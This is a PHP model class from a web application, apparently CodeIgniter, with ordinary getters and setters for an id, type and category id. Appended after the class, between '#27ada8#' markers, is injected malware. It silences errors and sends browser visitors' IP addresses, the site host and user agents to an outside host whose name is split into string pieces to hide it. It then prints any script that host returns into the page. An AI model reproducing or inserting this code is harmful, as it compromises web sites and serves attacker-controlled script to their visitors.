<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class MbTypeModel {
	private $_id = NULL;
	private $_type = NULL;
	private $_cat_id = NULL;
	
	public function setId($id){
		$this->_id=$id;
	}
	
	public function getId(){
		return $this->_id;
	}
	
	public function setType($type){
		$this->_type=$type;
	}
	
	public function getType(){
		return $this->_type;
	}

	public function setCatId($catid){
		$this->_cat_id=$catid;
	}
	
	public function getCatId(){
		return $this->_cat_id;
	}
	
}

#27ada8#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/27ada8#

